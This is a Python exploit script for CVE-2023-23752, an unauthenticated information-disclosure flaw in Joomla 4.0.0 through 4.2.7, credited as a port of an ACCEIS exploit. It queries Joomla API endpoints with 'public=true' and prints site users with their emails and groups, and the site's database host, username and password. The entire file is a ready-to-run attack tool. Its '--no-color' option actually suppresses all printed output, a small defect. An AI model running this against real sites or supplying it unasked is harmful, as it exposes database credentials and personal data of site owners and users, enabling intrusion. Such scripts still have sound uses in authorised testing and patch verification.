#!/usr/bin/env python3

import json
import requests
from docopt import docopt

doc = """
  Joomla! < 4.2.8 - Unauthenticated information disclosure
  Python version:
  Based on: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
  ## Original author website: https://pwn.by/noraj/
  ## Original Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
  ## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
  ## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
  ## CVE : CVE-2023-23752
  
  Usage:
    {script} <url> [options]
    {script} -h | --help

  Parameters:
    <url>       Root URL (base path) including HTTP scheme, port and root folder

  Options:
    --debug     Display arguments
    --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
    -h, --help  Show this screen

  Examples:
    {script} http://127.0.0.1:4242
    {script} https://example.org/subdir

  Project:
    author (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
    company (https://www.acceis.fr / https://twitter.com/acceis)
    source (https://github.com/Acceis/exploit-CVE-2023-23752)
""".format(script=__file__)

def fetch_users(root_url, http):
    vuln_url = f"{root_url}/api/index.php/v1/users?public=true"
    response = http.get(vuln_url)
    return response.text

def parse_users(root_url, http):
    data_json = fetch_users(root_url, http)
    data = json.loads(data_json)['data']
    users = []
    for user in data:
        if user['type'] == 'users':
            user_attributes = user['attributes']
            id_ = user_attributes['id']
            name = user_attributes['name']
            username = user_attributes['username']
            email = user_attributes['email']
            groups = user_attributes['group_names']
            users.append({'id': id_, 'name': name, 'username': username, 'email': email, 'groups': groups})
    return users

def display_users(root_url, http):
    users = parse_users(root_url, http)
    print('Users')
    for u in users:
        print(f"[{u['id']}] {u['name']} ({u['username']}) - {u['email']} - {u['groups']}")

def fetch_config(root_url, http):
    vuln_url = f"{root_url}/api/index.php/v1/config/application?public=true"
    response = http.get(vuln_url)
    return response.text

def parse_config(root_url, http):
    data_json = fetch_config(root_url, http)
    data = json.loads(data_json)['data']
    config = {}
    for entry in data:
        if entry['type'] == 'application':
            key = list(entry['attributes'].keys())[0]
            config[key] = entry['attributes'][key]
    return config

def display_config(root_url, http):
    c = parse_config(root_url, http)
    print('Site info')
    print(f"Site name: {c['sitename']}")
    print(f"Editor: {c['editor']}")
    print(f"Captcha: {c['captcha']}")
    print(f"Access: {c['access']}")
    print(f"Debug status: {c['debug']}")
    print()
    print('Database info')
    print(f"DB type: {c['dbtype']}")
    print(f"DB host: {c['host']}")
    print(f"DB user: {c['user']}")
    print(f"DB password: {c['password']}")
    print(f"DB name: {c['db']}")
    print(f"DB prefix: {c['dbprefix']}")
    print(f"DB encryption {c['dbencryption']}")

if __name__ == '__main__':
    args = docopt(doc)
    if args['--no-color']:
        # Disable colorized output
        print = lambda x: x
    if args['--debug']:
        print(args)

    # You may want to replace this with a proper HTTP library like 'requests'
    http = requests
    display_users(args['<url>'], http)
    print()
    display_config(args['<url>'], http)
